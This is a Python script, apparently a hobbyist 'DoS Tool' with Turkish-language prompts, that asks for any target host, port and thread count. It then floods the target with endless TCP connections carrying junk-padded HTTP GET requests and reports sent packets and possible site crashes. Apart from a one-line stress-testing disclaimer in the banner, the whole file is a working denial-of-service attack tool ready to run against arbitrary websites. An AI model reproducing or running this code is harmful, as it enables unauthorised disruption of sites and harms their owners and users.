
#DoS Tool By MukoHacking..

import socket
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
   _____         __           ___ ___                __   .__                
  /     \  __ __|  | ______  /   |   \_____    ____ |  | _|__| ____    ____  
 /  \ /  \|  |  \  |/ /  _ \/    ~    \__  \ _/ ___\|  |/ /  |/    \  / ___\ 
/    Y    \  |  /    <  <_> )    Y    // __ \\  \___|    <|  |   |  \/ /_/  >
\____|__  /____/|__|_ \____/ \___|_  /(____  /\___  >__|_ \__|___|  /\___  / 
        \/           \/            \/      \/     \/     \/       \//_____/  

         DİKKAT: Bu Araç Stres Testi Yapmak Amacıyla
                 Yapılmıştır.Kurallara uyarak kullanmanız
                 önerilir.
               
      ''')
time.sleep(1)
def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "(Örnek : www.example.com) Adres:\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Çalıştırma Başına İsabet Sayısı [Ortalama olarak 1-10 yazabilirsiniz] :\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Konu Sayısı [Ortalama olarak 100-1000 yazabilirsiniz] :\r\n"))
input("Saldırıyı başlatmak için Enter tuşuna basın.")
ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 0;



class Count:
    packetCounter = 0 

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "/-------/ PAKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " BAŞARIYLA GÖNDERILDI: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "Siteye ulaşılamıyor site çökmüş olabilir!")
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Kullanıcı tarafından iptal edildi.")
            except socket.error:
                print(ConsoleColors.WARNING + "Siteye yavaşlamış ya da çökmüş olabilir")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Kullanıcı tarafından iptal edildi.")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Kullanıcı tarafından iptal edildi.")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
              DoS saldırısı başlatılıyor!
              ._.
              | |
              | |
               \|
               __
               \/
          ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Yükleniyor >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Yükleniyor >> [=====               ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "Yükleniyor >> [==========          ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "Yükleniyor >> [===============     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "Yükleniyor >> [====================] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Kullanıcı tarafından iptal edildi.")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Kullanıcı tarafından iptal edildi.")